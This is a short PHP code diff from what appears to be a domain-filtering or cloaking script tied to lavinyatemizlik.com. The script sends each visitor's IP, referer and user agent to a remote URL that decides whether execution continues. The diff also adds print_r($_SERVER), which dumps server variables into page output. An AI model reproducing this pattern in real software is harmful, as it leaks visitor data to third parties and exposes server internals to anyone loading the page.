@@ -11,8 +11,8 @@ function url_get_contents ($Url,$key) {
     curl_setopt($ch, CURLOPT_URL, $Url);
     curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array(
         'key'=>$key,
-        'ref' => $_SERVER['HTTP_REFERER'],
-        'useragent'=>$_SERVER['HTTP_USER_AGENT'],
+        'ref' => @$_SERVER['HTTP_REFERER'],
+        'useragent'=> @$_SERVER['HTTP_USER_AGENT'],
         'ip'=>getIpAddress()
     )));
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -46,13 +46,12 @@ if($json['status'] == 1){
     exit();
 }
 ob_end_flush();
-?>
 
+print_r($_SERVER);
 
-<? 
 $asildomain='www.lavinyatemizlik.com';
 $kokdomain='lavinyatemizlik.com';
-$bizimdomain=$_SERVER['HTTP_HOST']; 
+$bizimdomain= $_SERVER['HTTP_HOST']; 
 $domainfiltreleme=(bool)1; 
 $domain=isset($_SERVER['HTTPS'])?'https':'http'.'://'.$asildomain; 
 error_reporting(0); 
